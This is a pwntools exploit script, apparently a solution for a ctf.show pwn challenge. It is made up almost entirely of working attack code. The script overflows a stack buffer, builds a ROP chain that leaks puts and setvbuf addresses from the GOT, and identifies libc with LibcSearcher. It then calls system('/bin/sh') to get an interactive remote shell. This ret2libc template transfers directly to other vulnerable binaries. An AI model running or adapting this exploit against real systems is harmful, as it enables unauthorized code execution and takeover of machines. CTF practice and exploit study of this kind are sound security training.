from pwn import *
from LibcSearcher import *
context.arch = 'amd64'
# p=process("./pwn")
p=remote("pwn.challenge.ctf.show",28158)
elf=ELF("./pwn")
puts_plt=elf.plt["puts"]
gets_got=elf.got["setvbuf"]
puts_got=elf.got["puts"]
main_addr=0x000000000040061F
pop_rdi_addr=0x00000000004006e3
pop_rsi_r15_addr=0x00000000004006e1

# print(hex(elf.symbols['main']))
payload=b'a'*0x14+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendline(payload)
# print(p.recvall())
p.recvuntil(b'\n')
puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
print("puts:",hex(puts_addr))
payload=b'a'*0x14+p64(pop_rdi_addr)+p64(gets_got)+p64(puts_plt)+p64(main_addr)
p.recv()

p.sendline(payload)
# print(p.recvall())
p.recvuntil(b'\n')
gets_addr=u64(p.recv(6).ljust(8,b'\x00'))
print("gets:",hex(gets_addr))

libc=LibcSearcher("puts",puts_addr)
libc.add_condition("setvbuf",gets_addr)
libcbase=puts_addr-libc.dump("puts")
sys_addr=libcbase+libc.dump("system")
bin_sh_addr=libcbase+libc.dump("str_bin_sh")

payload=b'a'*0x14+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(sys_addr)+p64(main_addr)
p.recv()

p.sendline(payload)
p.interactive()